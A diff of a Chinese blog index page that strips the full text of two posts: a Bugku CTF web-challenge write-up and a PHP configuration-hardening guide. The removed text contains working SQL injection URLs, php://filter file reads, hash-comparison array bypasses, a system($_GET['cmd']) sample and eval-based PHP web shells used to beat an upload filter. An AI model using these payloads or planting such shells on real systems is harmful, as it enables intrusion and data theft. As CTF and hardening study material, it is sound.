@@ -313,72 +313,14 @@
 
       
         
-          
-            <h3 id="1-web2"><a href="#1-web2" class="headerlink" title="1.web2"></a>1.web2</h3><p>直接右键查看元素就能看到flag<br><br>主要还是要养成看源码的习惯<br><img src="/img/3261.jpg" alt=""></p>
-<h3 id="2-文件上传测试"><a href="#2-文件上传测试" class="headerlink" title="2.文件上传测试"></a>2.文件上传测试</h3><p>上传php说非图片文件,上传图片说非php文件,应该是一个上传绕过，通过burpsuit抓包改文件名后缀轻松绕过。<br><br><img src="/img/3262.png" alt=""></p>
-<h3 id="3-计算器"><a href="#3-计算器" class="headerlink" title="3.计算器"></a>3.计算器</h3><p>谷歌浏览器F12修改样式，轻松绕过<br><br>用户是可以通过浏览器修改前端代码的，所以类似通过js或者html的过滤限制是可以用同样方法绕过<br><img src="/img/3263.png" alt=""></p>
-<h3 id="4-矛盾"><a href="#4-矛盾" class="headerlink" title="4.矛盾"></a>4.矛盾</h3><p>简单的numeric绕过，输入num=1*0轻松绕过<br></p>
-<ol>
-<li>is_numeric(“1*0”) false</li>
-<li>is_numeric(“1x0”) false</li>
-<li>is_numeric(1*0) true</li>
-<li>is_numeric(0x1) true</li>
-<li>is_numeric(“0x1”) true</li>
-<li>is_numeric(0e1231) true</li>
-</ol>
-<h3 id="5-WEB3"><a href="#5-WEB3" class="headerlink" title="5.WEB3"></a>5.WEB3</h3><p>查看源码看到这一串<img src="/img/3271.png" alt=""><br><br>进行html解码得到flag：KEY{J2sa42ahJK-HS11III}</p>
-<h3 id="6-SQL测试"><a href="#6-SQL测试" class="headerlink" title="6.SQL测试"></a>6.SQL测试</h3><p>查看源码看到这一段<br><br><img src="/img/3272.png" alt=""><br><br>可以考虑宽字节注入，用%bf吃掉%5c，ok，果然报错</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10083/?id=1%bf&apos;</span><br></pre></td></tr></table></figure>
-<p>其他and 1=1 ，测字段老套路了，下面报数据库名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10083/?id=-1%bf&apos; union select schema_name,2 from information_schema.schemata--+</span><br></pre></td></tr></table></figure></p>
-<p>报表名</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10083/?id=-1%bf&apos; union select table_name,2 from information_schema.tables where table_schema=database()--+</span><br></pre></td></tr></table></figure>
-<p>报列名，这里一开始表名我是尝试’key’,结果被转义，所以可以用16进制绕过</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10083/?id=-1%bf&apos; union select column_name,2 from information_schema.columns where table_name=0x6b6579--+</span><br></pre></td></tr></table></figure>
-<p>最后报数据</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10083/?id=-1%bf&apos; union select string,2 from sql5.key --+</span><br></pre></td></tr></table></figure>
-<h3 id="7-域名解析"><a href="#7-域名解析" class="headerlink" title="7.域名解析"></a>7.域名解析</h3><p>进入kali，vi更改/etc/hosts文件，增加如下内容<br><br>120.24.86.145 flag.bugku.com<br><br><img src="/img/3273.png" alt=""><br><br>访问flag.bugku.com 得到flag<br><br><img src="/img/3274.png" alt=""><br></p>
-<h3 id="8-SQL注入1"><a href="#8-SQL注入1" class="headerlink" title="8.SQL注入1"></a>8.SQL注入1</h3><p>关键函数strip_tags($id)：从字符串中去除 HTML 和 PHP 标记，<br>所以可以在过滤的字段中加&lt;&gt;，也可以%00截断。<br><br><br>1=1，1=2分析出后台sql语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10087/?id=1 an%00d 1=2 #</span><br></pre></td></tr></table></figure></p>
-<p>其他类似上面的，直接报数据</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10087/?id=-1 uni%00on sel%00ect 1,hash fro%00m sql3.key --+</span><br></pre></td></tr></table></figure>
-<h3 id="9-你必须让他停下来"><a href="#9-你必须让他停下来" class="headerlink" title="9.你必须让他停下来"></a>9.你必须让他停下来</h3><p>放到burpsuit重放，go几次就出flag了<br><img src="/img/3275.png" alt=""><br></p>
-<h3 id="10-本地包含"><a href="#10-本地包含" class="headerlink" title="10.本地包含"></a>10.本地包含</h3><p>看题目一开始以为是文件包含，进去以后包含了几个文件无果，代码审计一波看到关键函数eval( “var_dump($a);”); 典型的php代码执行漏洞。<br><br><br>下面各种获取源码姿势<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;1&gt;hell=);show_source(&quot;flag.php&quot;);//</span><br><span class="line">&lt;2&gt;hello=file(&quot;flag.php&quot;)</span><br><span class="line">&lt;3&gt;hello=);include(&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span><br><span class="line">&lt;4&gt;hello=);print_r(file(&quot;flag.php&quot;)</span><br><span class="line">&lt;5&gt;hello=);include(@$_POST[&apos;b&apos;]</span><br><span class="line">    在POST区域：b=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure></p>
-<h3 id="11-变量1"><a href="#11-变量1" class="headerlink" title="11.变量1"></a>11.变量1</h3><p>又是一道php代码执行，关注这句代码<br><br>eval(“var_dump($$args);”);<br><br>用户所能控制的只有变量名，直接输入GLOBALS爆出所有全局变量。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:8004/index1.php?args=GLOBALS</span><br></pre></td></tr></table></figure>
-<h3 id="12-web5"><a href="#12-web5" class="headerlink" title="12.web5"></a>12.web5</h3><p>右键查看源码看到一堆括号，我也不知道是什么东西，网上查是JSPFUCK，F12，扔进控制器执行得到flag<br><img src="/img/3277.png" alt=""><br></p>
-<h3 id="13-头等舱"><a href="#13-头等舱" class="headerlink" title="13.头等舱"></a>13.头等舱</h3><p>抓响应包直接给我们flag了…<br><br><img src="/img/3278.png" alt=""><br></p>
-<h3 id="14-flag在index里"><a href="#14-flag在index里" class="headerlink" title="14.flag在index里"></a>14.flag在index里</h3><p>click进去，看url<br><br><img src="/img/3279.png" alt=""><br><br><br>应该是文件包含漏洞，那flag在哪里呢<br>试试包含test5、flag.php无果<br>php://input试试，返回Oh no！<br>最后试试php流filter，成功!</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
-<p>得到base64的源码，去burp解码一下就得到flag啦。<br><img src="/img/32711.png" alt=""><br></p>
-<h3 id="15-请输入密码查看flag"><a href="#15-请输入密码查看flag" class="headerlink" title="15.请输入密码查看flag"></a>15.请输入密码查看flag</h3><p>请输入5位数字密码查看，那还用说，直接burp爆破<br><br><img src="/img/32712.png" alt=""><br></p>
-<h3 id="16-点击一百万次"><a href="#16-点击一百万次" class="headerlink" title="16.点击一百万次"></a>16.点击一百万次</h3><p>这题应该是有两个地方有检查，<br>一个是前端的js检查，要大于一百万才能发出请求的数据包。</p>
-<p>因此我们把clicks改为1，这样点一下就能玩一年啦。<br><img src="/img/32713.png" alt=""><br><br>OK，包发出去了，但是服务器没有给我们返回flag，那么应该后端也有检查，burp抓包修改click值，成功！<br><img src="/img/32714.png" alt=""><br><br>得到flag<br><img src="/img/32715.png" alt=""><br></p>
-<h3 id="17-备份是个好习惯"><a href="#17-备份是个好习惯" class="headerlink" title="17.备份是个好习惯"></a>17.备份是个好习惯</h3><p>尝试访问index.php.bak，成功下载文件下来<br><img src="/img/32716.png" alt=""><br><br>运用了两次md5，所以需要构造一下绕过。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:8002/web16/?kekeyy1[]=1&amp;kekeyy2[]=2</span><br></pre></td></tr></table></figure>
-<h3 id="18-成绩单"><a href="#18-成绩单" class="headerlink" title="18.成绩单"></a>18.成绩单</h3><p>基于post的union类的sql注入<br>，其他老套路。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:8002/chengjidan/index.php</span><br><span class="line">post：id=-1&apos; union select 1,2,3,skctf_flag from fl4g#</span><br></pre></td></tr></table></figure>
-<h3 id="19-never-give-up"><a href="#19-never-give-up" class="headerlink" title="19.never give up"></a>19.never give up</h3><p>右键源代码，看到1p.html<br><br>直接访问<a href="http://120.24.86.145:8006/test/1p.html，老是跳转到bugku官网，无果" target="_blank" rel="noopener">http://120.24.86.145:8006/test/1p.html，老是跳转到bugku官网，无果</a><br><br>试试直接查看源代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://120.24.86.145:8006/test/1p.html</span><br></pre></td></tr></table></figure></p>
-<p>得到一串编码过的数据<br><br><img src="/img/32718.png" alt=""><br>经分析，通过url解码，再base64解码，最后还要url解码得到源码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">if(!$_GET[&apos;id&apos;])</span><br><span class="line">&#123;</span><br><span class="line">	header(&apos;Location: hello.php?id=1&apos;);</span><br><span class="line">	exit();</span><br><span class="line">&#125;</span><br><span class="line">$id=$_GET[&apos;id&apos;];</span><br><span class="line">$a=$_GET[&apos;a&apos;];</span><br><span class="line">$b=$_GET[&apos;b&apos;];</span><br><span class="line">if(stripos($a,&apos;.&apos;))</span><br><span class="line">&#123;</span><br><span class="line">	echo &apos;no no no no no no no&apos;;</span><br><span class="line">	return ;</span><br><span class="line">&#125;</span><br><span class="line">$data = @file_get_contents($a,&apos;r&apos;);</span><br><span class="line">if($data==&quot;bugku is a nice plateform!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4)</span><br><span class="line">&#123;</span><br><span class="line">	require(&quot;f4l2a3g.txt&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">	print &quot;never never never give up !!!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>然后有个猥琐解法直接访问f4l2a3g.txt就能得到flag了<br><br>耿直解法：<br></p>
-<ul>
-<li>$data==”bugku is a nice plateform!”：可以令a=php://input，然后POST传值 bugku is a nice plateform! 绕过。</li>
-<li>strlen($b)&gt;5 and eregi(“111”.substr($b,0,1),”1114”) and substr($b,0,1)!=4：可以利用%00截断，令b=%0012345 绕过。</li>
-<li>!$_GET[‘id’]并且id==0：令id=%00或者令id=.都可以绕过。 </li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:8006/test/hello.php?a=php://input&amp;b=%0012345&amp;id=.</span><br><span class="line">post:bugku is a nice plateform!</span><br></pre></td></tr></table></figure>
-<p>典型的找源码，解密，代码审计题目</p>
-<h3 id="20-前女友"><a href="#20-前女友" class="headerlink" title="20.前女友"></a>20.前女友</h3><p>查看源代码,<br><img src="/img/32719.png" alt=""><br>有个链接，点击得到源码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&apos;v1&apos;]) &amp;&amp; isset($_GET[&apos;v2&apos;]) &amp;&amp; isset($_GET[&apos;v3&apos;]))&#123;</span><br><span class="line">    $v1 = $_GET[&apos;v1&apos;];</span><br><span class="line">    $v2 = $_GET[&apos;v2&apos;];</span><br><span class="line">    $v3 = $_GET[&apos;v3&apos;];</span><br><span class="line">    if($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))&#123;</span><br><span class="line">        if(!strcmp($v3, $flag))&#123;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>md5可以通过数组绕过，strcmp也可以通过数组绕过，构造得到flag</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.89.219.210:49162/?v1[]=1&amp;v2[]=2&amp;v3[]=1</span><br></pre></td></tr></table></figure>
-<h3 id="21-各种绕过"><a href="#21-各种绕过" class="headerlink" title="21.各种绕过"></a>21.各种绕过</h3><p>进去看到一串源码<br></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(&apos;flag.php&apos;);</span><br><span class="line">$_GET[&apos;id&apos;] = urldecode($_GET[&apos;id&apos;]);</span><br><span class="line">$flag = &apos;flag&#123;xxxxxxxxxxxxxxxxxx&#125;&apos;;</span><br><span class="line">if (isset($_GET[&apos;uname&apos;]) and isset($_POST[&apos;passwd&apos;])) &#123;</span><br><span class="line">    if ($_GET[&apos;uname&apos;] == $_POST[&apos;passwd&apos;])</span><br><span class="line"></span><br><span class="line">        print &apos;passwd can not be uname.&apos;;</span><br><span class="line"></span><br><span class="line">    else if (sha1($_GET[&apos;uname&apos;]) === sha1($_POST[&apos;passwd&apos;])&amp;($_GET[&apos;id&apos;]==&apos;margin&apos;))</span><br><span class="line"></span><br><span class="line">        die(&apos;Flag: &apos;.$flag);</span><br><span class="line"></span><br><span class="line">    else</span><br><span class="line"></span><br><span class="line">        print &apos;sorry!&apos;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>主要是绕过sha1函数，类似md5绕过，提交数组上去就行了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:8002/web7/?uname[]=1&amp;id=margin</span><br><span class="line">post:passwd[]=2</span><br></pre></td></tr></table></figure></p>
-<h3 id="文件包含2"><a href="#文件包含2" class="headerlink" title="文件包含2"></a>文件包含2</h3><p>查看源码，看到<img src="/img/32720.png" alt=""><br>果断包含upload.php,看到上传文件的界面<br><br><img src="/img/32721.png" alt=""><br><br>构造小马，发现过滤了&lt;?php ?&gt;<br><br>可以这样绕过</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=@eval($_POST[&apos;cmd&apos;]);</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_POST[&apos;cmd&apos;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p>然后执行<br><br><img src="/img/32722.png" alt=""><br>最后包含flag文件</p>
-
-          
+          <h3 id="1-web2"><a href="#1-web2" class="headerlink" title="1.web2"></a>1.web2</h3><p>直接右键查看元素就能看到flag<br><br>主要还是要养成看源码的习惯<br><img src="/img/3261.jpg" alt=""><br>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/04/23/bugku个人笔记/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -495,53 +437,20 @@
 
       
         
-          
-            <p>了解php的配置对web渗透还是很重要的~</p>
+          <p>了解php的配置对web渗透还是很重要的~</p>
 <h3 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h3><ol>
 <li>大小写敏感<br> directive = value (指令=值)<br> foo=bar ≠ FOO=bar</li>
 <li>运算符<br>|、&amp;、~、! </li>
 <li>空值的表达式<br> foo = ;<br> foo = none ;<br> foo = “none” 是空的字符串</li>
 </ol>
-<h3 id="安全模式"><a href="#安全模式" class="headerlink" title="安全模式"></a>安全模式<br></h3><p>safe_mode = off<br>安全模式，用来限制文档的存取<br>与命令执行漏洞有关</p>
-<p><em>本特性已在PHP5.4.0被移除</em></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cmd = $_GET[&apos;cmd&apos;];</span><br><span class="line">system($cmd);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>关闭safe_mode，可以进行命令执行<br><img src="/img/40501.png" alt=""><br>开启safe_mode，显示为空白<br>    <img src="/img/40502.png" alt=""></p>
-<h3 id="限制环境变量存取"><a href="#限制环境变量存取" class="headerlink" title="限制环境变量存取"></a>限制环境变量存取<br></h3><p>safe_mode_allowed_env_vars = string<br><br>制定PHP程序可以改变的环境变量的前缀，当这个选项的值为空时，那么PHP可以改变任何环境变量</p>
-<h3 id="外部程序执行目录"><a href="#外部程序执行目录" class="headerlink" title="外部程序执行目录"></a>外部程序执行目录<br></h3><p>指定网站的主目录</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">safe_mode_exec_dir = &quot;E:\Local Test\WWW&quot;</span><br></pre></td></tr></table></figure>
-<h3 id="禁用函数"><a href="#禁用函数" class="headerlink" title="禁用函数"></a>禁用函数<br></h3><p>disable_functions<br><br>为了更安全的运行PHP，可以用此指令来禁止一些敏感函数的使用，当你想用本指令禁止一些函数时，切忌把dl()函数也加到禁止列表，攻击者可以利用dl()函数加载自定义的php扩展来突破disalbe_function。配置禁用函数时可以使用逗号分隔函数名</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disable_functions = system</span><br></pre></td></tr></table></figure>
-<p><img src="/img/40503.png" alt=""></p>
-<h3 id="com组件"><a href="#com组件" class="headerlink" title="com组件"></a>com组件<br></h3><p>默认为true<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.allow_dcom = false</span><br></pre></td></tr></table></figure></p>
-<p>PHP设置在安全模式下(safe_mode)，仍旧允许攻击者使用COM()函数来创建系统组件来执行任意命令，推荐关闭这个函数来防止出现此漏洞</p>
-<p>使用COM()函数需要在PHP.ini中配置extension=php_com_dotnet.dll，如果PHP&lt;5.4.5 则不需要</p>
-<h3 id="全局变量注册开关"><a href="#全局变量注册开关" class="headerlink" title="全局变量注册开关"></a>全局变量注册开关</h3><p><br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">register_globals = off</span><br></pre></td></tr></table></figure></p>
-<p>php.ini的register_globals选项的默认值预设为off，在4.2版本之前是默认开启的，当register_globals的设定为On时，程序可以接受来自服务器的各种环境变量，包括表单提交的变量，这是对服务器来讲是非常不安全的，所以我们不能让它注册为全局变量。</p>
-<ul>
-<li>register_globals=Off时，服务器端获取数据的时候用$_GET[‘name’]来获取数据</li>
-<li>register_globals=On时，服务器端使用POST或者GET提交的变量，都将自动使用全局变量的值来接受值</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&apos;&apos; method=&apos;get&apos;&gt;</span><br><span class="line">&lt;input type=&apos;text&apos; name=&apos;username&apos; value=&apos;alex&apos; &gt;</span><br><span class="line">&lt;input type=&apos;submit&apos; name=&apos;sub&apos; value=&apos;sub&apos;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">echo &apos;username::&apos;,$username;</span><br><span class="line">echo &apos;&lt;br&gt;sub::&apos;,$sub;</span><br><span class="line">echo &apos;&lt;br&gt;GET::&apos;;</span><br><span class="line">print_r($_GET);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>当设置为off时<br><img src="/img/40505.png" alt=""><br>设置为On时<br><img src="/img/40506.png" alt=""></p>
-<h3 id="魔术引号自动过滤"><a href="#魔术引号自动过滤" class="headerlink" title="魔术引号自动过滤"></a>魔术引号自动过滤<br></h3><p>magic_quotes_gpc= on<br>magic_quotes_gpc = Off 在php.ini里是默认关闭的，如果它打开后将自动把用户提交对sql的查询语句进行转换，如果设置成ON的话，PHP会把所有的单引号、双引号、反斜杠和空字符加上反斜杠进行转义，它会影响HTTP请求的数据有（GET、POST、Cookies），开启它会提高网站的安全性，当然，也可以使用addslashes来转义提交的HTTP请求数据，或者用stripslashes来删除转义</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = $_GET[&apos;a&apos;];</span><br><span class="line">echo $a;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>当关闭魔术过滤，可以看到原样输出</p>
-<p><img src="/img/40507.png" alt=""><br>当开启魔术过滤，就被转义了<br><img src="/img/40508.png" alt=""></p>
-<h3 id="是否允许包含远程文件"><a href="#是否允许包含远程文件" class="headerlink" title="是否允许包含远程文件"></a>是否允许包含远程文件</h3><p><br>allow_url_include = off<br>该配置为on的情况下，可以直接包含远程文件，若包含的变量为可控的情况下，可以直接控制变量来执行PHP代码</p>
-<h3 id="HTTP头版本信息"><a href="#HTTP头版本信息" class="headerlink" title="HTTP头版本信息"></a>HTTP头版本信息</h3><p><br> expose_php = off<br><br> 防止了通过http头部泄露的php版本信息</p>
-<h3 id="文件上传临时目录"><a href="#文件上传临时目录" class="headerlink" title="文件上传临时目录"></a>文件上传临时目录</h3><p><br> upload_tmp_dir =<br><br>上传文件临时保存的目录，如果不设置的话，则采用系统的临时目录</p>
-<h3 id="用户可访问目录"><a href="#用户可访问目录" class="headerlink" title="用户可访问目录"></a>用户可访问目录<br></h3><pre><code>open_basedir = E:\Local Test\WWW&lt;br&gt;&lt;br&gt;
-</code></pre><p>能够控制PHP脚本只能访问指定的目录，这样能够避免PHP脚本访问，不应该访问的文件，一定程度上限制了phpshell的危害</p>
-<p>查看目录文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump(scandir(dirname(__FILE__)));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
-<p>并限制可访问目录为当前目录</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open_basedir =C:\www\zaxiang</span><br></pre></td></tr></table></figure>
-<p>查看目录<br><img src="/img/40509.png" alt=""><br>查看其他目录</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump(scandir(dirname(__FILE__.&quot;./../&quot;)));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="/img/40510.png" alt=""><br>访问被拒绝</p>
-<h3 id="内部错误选项"><a href="#内部错误选项" class="headerlink" title="内部错误选项"></a>内部错误选项</h3><p>display_errors = on<br>表明显示PHP脚本的内部错误，网站发布后建议关闭PHP的错误回显，在调试的时候通常把PHP错误显示打开</p>
-<h3 id="错误报告级别"><a href="#错误报告级别" class="headerlink" title="错误报告级别"></a>错误报告级别<br></h3><p>error_reportting = E_ALL &amp; ~E_NOTICE<br>这个设置的作用是将错误级别调到最高，显示所有问题，方便排错</p>
-
-          
+<h3 id="安全模式"><a href="#安全模式" class="headerlink" title="安全模式"></a>安全模式<br></h3><p>safe_mode = off<br>安全模式，用来限制文档的存取<br>与命令执行漏洞有关<br>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/04/07/PHP核心配置/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
